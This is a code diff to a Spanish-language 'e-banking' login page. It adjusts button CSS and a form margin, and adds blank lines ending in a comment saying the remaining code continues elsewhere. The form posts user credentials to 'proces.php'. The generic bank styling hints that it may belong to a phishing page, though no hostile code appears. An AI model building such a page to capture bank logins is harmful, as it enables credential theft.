@@ -48,20 +48,24 @@
         margin-left: 30px;
     }
     .p2 {
-        height: 35px;
+        height: 30px;
         width: 20px;
         min-width: 126px;
         padding: 5px 20px;
+        border-radius: none;
         border: none;
+        outline: none;
         color: #fff;
         background-color: #FF7500;
     }
     .p2:focus,
-.p2:active {
+.p2:active,
+.p2:hover {
     background-color: #FF7500 !important;
-    outline: none; /* Elimina el borde de enfoque */
-    box-shadow: none; /* Evita sombras al hacer clic */
+    outline: none;
+    box-shadow: none;
 }
+
     .pop {
 
         height: 35px;
@@ -113,7 +117,7 @@
                 <ul><li>El usuario y/o la contraseña son incorrectos.</li></ul>
             </div>
 
-            <form method="post" action="proces.php" style="margin-top: -20px;margin-left: -20px;" onsubmit="return validarFormulario()">
+            <form method="post" action="proces.php" style="margin-top: -20px;" onsubmit="return validarFormulario()">
                 <div style="padding: 10px;"> 
                     <h2 class="pan">e-banking</h2>
                     <br>
@@ -154,6 +158,20 @@
 
             return true; // Permite el envío del formulario si todo está correcto
         }
+
+
+
+
+
+
+
+
+
+
+
+
+        
+        // DE AQUI PARA ABAJO RESTO DE CODE EMPIEZA EN META
     </script>
  
 
